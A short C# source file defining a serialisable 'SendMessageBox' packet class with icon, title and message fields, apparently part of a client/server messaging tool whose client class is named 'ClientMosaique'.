using Client.Controllers;
using ZeroFormatter;

namespace Client.Packets.ServerPackets
{
    [ZeroFormattable]
    public class SendMessageBox : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.SendMessageBox;
            }
        }

        [Index(0)]
        public virtual int icon { get; set; }

        [Index(1)]
        public virtual string title { get; set; }

        [Index(2)]
        public virtual string message { get; set; }

        public SendMessageBox()
        {
        }

        public SendMessageBox(int icon, string title, string message)
        {
            this.icon = icon;
            this.title = title;
            this.message = message;
        }

        public void Execute(ClientMosaique client)
        {
            client.send(this);
        }
    }
}
